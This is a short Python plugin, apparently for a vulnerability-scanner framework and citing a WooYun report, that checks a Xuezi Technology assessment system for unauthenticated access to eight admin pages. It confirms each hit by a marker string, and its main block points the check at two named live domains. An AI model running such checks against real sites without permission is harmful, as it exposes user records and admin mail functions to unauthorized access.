#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: 学子科技诊断测评系统多处未授权访问
author: yichin
refer: http://www.wooyun.org/bugs/wooyun-2010-0138025
description:
    http://**.**.**.**/ceping/HouAdmin/GLComUser.aspx
    http://**.**.**.**/ceping/HouAdmin/GL_Shitileibie.aspx
    http://**.**.**.**/ceping/HouAdmin/GL_PingFen.aspx
    http://**.**.**.**/ceping/HouAdmin/GL_FenXiFuDao.aspx
    ...
'''

def assign(service, arg):
    if service == 'xuezi_ceping':
        return True, arg

def audit(arg):
    urls = [
        arg + 'ceping/HouAdmin/GLGWUsers.aspx',
        arg + 'ceping/HouAdmin/GLComUser.aspx',
        arg + 'ceping/HouAdmin/GLComleibie2.aspx',
        arg + 'ceping/HouAdmin/GL_Shitileibie.aspx',
        arg + 'ceping/HouAdmin/GL_PingFen.aspx',
        arg + 'ceping/HouAdmin/GL_FenXiFuDao.aspx',
        arg + 'ceping/HouAdmin/MailSection.aspx',
        arg + 'ceping/HouAdmin/sendmails.aspx'
        ]
    verifys = [
        '注册时间',
        '注册时间',
        '类别名称',
        '添加试题类别',
        '请选择类别',
        '分析报告',
        '发件地址',
        '邮件内容'
        ]
    for i in range(len(urls)):
        url = urls[i]
        verify = verifys[i]
        code, head, res, err, _ = curl.curl2(url)
        if (code == 200) and (verify in res):
            security_hole('未授权访问： ' + url)
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('xuezi_ceping', 'http://www.hongboyiti.com/')[1])
    audit(assign('xuezi_ceping', 'http://www.otaruedu.com/')[1])
